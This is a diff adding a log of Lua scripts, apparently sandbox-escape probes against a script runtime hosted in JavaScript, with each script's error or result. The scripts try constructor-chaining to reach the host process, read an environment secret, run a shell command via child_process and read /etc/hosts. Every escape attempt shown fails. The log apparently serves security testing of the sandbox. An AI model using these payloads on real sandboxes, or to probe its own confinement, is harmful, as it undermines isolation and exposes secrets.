@@ -1,0 +1,91 @@
+--- code 1 ---
+local F = probe.lookup.constructor
+result(tostring(F))
+--- result 1 ---
+{"ms":2,"hostCalls":0,"side":{"proxyLogBytes":247678},"ok":true,"isError":true}
+text (127 chars):
+Script execution failed:
+[string "local F = probe.lookup.constructor..."]:1: attempt to index a function value (field 'lookup')
+--- code 2 ---
+local F = probe.lookup.constructor
+local proc = F("return process")()
+result(proc.env.PROBE_SECRET)
+--- result 2 ---
+{"ms":2,"hostCalls":0,"side":{"proxyLogBytes":249636},"ok":true,"isError":true}
+text (127 chars):
+Script execution failed:
+[string "local F = probe.lookup.constructor..."]:1: attempt to index a function value (field 'lookup')
+--- code 3 ---
+local F = result.constructor
+local proc = F("return process")()
+result(proc.mainModule == nil and "no mainModule" or "has mainModule")
+--- result 3 ---
+{"ms":3,"hostCalls":0,"side":{"proxyLogBytes":251619},"ok":true,"isError":true}
+text (122 chars):
+Script execution failed:
+[string "local F = result.constructor..."]:1: attempt to index a function value (global 'result')
+--- code 4 ---
+local F = probe.lookup.constructor
+local cp = F("return process.getBuiltinModule('child_process')")()
+result(cp.execSync("echo PWNED"):toString())
+--- result 4 ---
+{"ms":2,"hostCalls":0,"side":{"proxyLogBytes":253624},"ok":true,"isError":true}
+text (127 chars):
+Script execution failed:
+[string "local F = probe.lookup.constructor..."]:1: attempt to index a function value (field 'lookup')
+--- code 5 ---
+local F = probe.lookup.constructor
+local fs = F("return process.getBuiltinModule('fs')")()
+result(fs.readFileSync("/etc/hosts", "utf8"))
+--- result 5 ---
+{"ms":2,"hostCalls":0,"side":{"proxyLogBytes":255619},"ok":true,"isError":true}
+text (127 chars):
+Script execution failed:
+[string "local F = probe.lookup.constructor..."]:1: attempt to index a function value (field 'lookup')
+--- code 6 ---
+local p = probe.lookup({id = 1})
+result(type(p) .. " " .. tostring(p.constructor))
+--- result 6 ---
+{"ms":3,"hostCalls":1,"side":{"proxyLogBytes":255753},"ok":true,"isError":false}
+text (51 chars):
+Script executed successfully.
+
+Result:
+userdata nil
+--- code 7 ---
+local p = probe.lookup({id = 1})
+local proc = p.constructor.constructor("return process")()
+result(proc.env.PROBE_SECRET)
+--- result 7 ---
+{"ms":2,"hostCalls":1,"side":{"proxyLogBytes":257729},"ok":true,"isError":true}
+text (125 chars):
+Script execution failed:
+[string "local p = probe.lookup({id = 1})..."]:2: attempt to index a nil value (field 'constructor')
+--- code 8 ---
+local p = _gateway.summary_stats()
+local cp = p.constructor.constructor("return process.getBuiltinModule('child_process')")()
+result(cp.execSync("echo PWNED"):toString())
+--- result 8 ---
+{"ms":2,"hostCalls":0,"side":{"proxyLogBytes":259994},"ok":true,"isError":true}
+text (127 chars):
+Script execution failed:
+[string "local p = _gateway.summary_stats()..."]:2: attempt to index a nil value (field 'constructor')
+--- code 9 ---
+local r = probe.lookup({id = 1}):await()
+result(type(r) .. " " .. tostring(getmetatable(r)) .. " " .. tostring(r.constructor))
+--- result 9 ---
+{"ms":208,"hostCalls":1,"side":{"proxyLogBytes":260172},"ok":true,"isError":false}
+text (86 chars):
+Script executed successfully.
+
+Result:
+userdata protected metatable function: 0x10e3b0
+--- code 10 ---
+result(type(_gateway) .. " " .. type(_gateway.summary_stats) .. " " .. tostring(load))
+--- result 10 ---
+{"ms":18,"hostCalls":0,"side":{"proxyLogBytes":260310},"ok":true,"isError":false}
+text (71 chars):
+Script executed successfully.
+
+Result:
+userdata function function: 0x17
